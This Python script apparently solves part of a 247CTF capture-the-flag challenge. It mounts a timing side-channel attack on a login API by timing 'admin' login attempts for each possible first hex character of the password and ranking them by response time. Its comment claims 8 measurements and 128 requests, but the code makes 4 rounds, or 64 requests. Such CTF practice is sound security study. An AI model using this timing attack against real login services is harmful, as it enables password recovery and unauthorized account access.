#!/usr/bin/env python3
import requests
import time
import statistics

BASE_URL = "https://a2f2134654cc41a2.247ctf.com"
HEX_CHARS = "0123456789abcdef"

def get_token():
    resp = requests.get(f"{BASE_URL}/api/get_token", timeout=10)
    data = resp.json()
    token = data["message"].split("reset to ")[1].rstrip("!")
    return token

def try_password(username, password, api_token):
    start = time.time()
    resp = requests.post(
        f"{BASE_URL}/api/login",
        data={
            "username": username,
            "password": password,
            "api": api_token
        },
        timeout=10
    )
    elapsed = time.time() - start
    return resp.json(), elapsed

# Hacer 8 mediciones por cada uno de los 16 caracteres en la primera posición
# Eso son 128 requests exactos
api_token = get_token()
print(f"Token: {api_token}\n")

measurements_per_char = 4
all_measurements = {char: [] for char in HEX_CHARS}

request_count = 0
for i in range(measurements_per_char):
    print(f"Ronda {i+1}/{measurements_per_char}")
    for char in HEX_CHARS:
        test_password = char + "0" * 31
        result, elapsed = try_password("admin", test_password, api_token)
        all_measurements[char].append(elapsed)
        request_count += 1
        print(f"  {char}: {elapsed:.4f}s")

print(f"\nRequests usados: {request_count}/128\n")
print("Estadísticas por carácter:")
print("="*50)

stats = []
for char in HEX_CHARS:
    times = all_measurements[char]
    avg = statistics.mean(times)
    median = statistics.median(times)
    stdev = statistics.stdev(times) if len(times) > 1 else 0
    stats.append((char, avg, median, stdev))

# Ordenar por promedio descendente
stats.sort(key=lambda x: x[1], reverse=True)

for char, avg, median, stdev in stats:
    print(f"{char}: avg={avg:.4f}s, median={median:.4f}s, stdev={stdev:.4f}s")

print(f"\nEl carácter más lento (promedio): {stats[0][0]}")
print(f"El carácter más rápido (promedio): {stats[-1][0]}")
print(f"Diferencia: {stats[0][1] - stats[-1][1]:.4f}s")
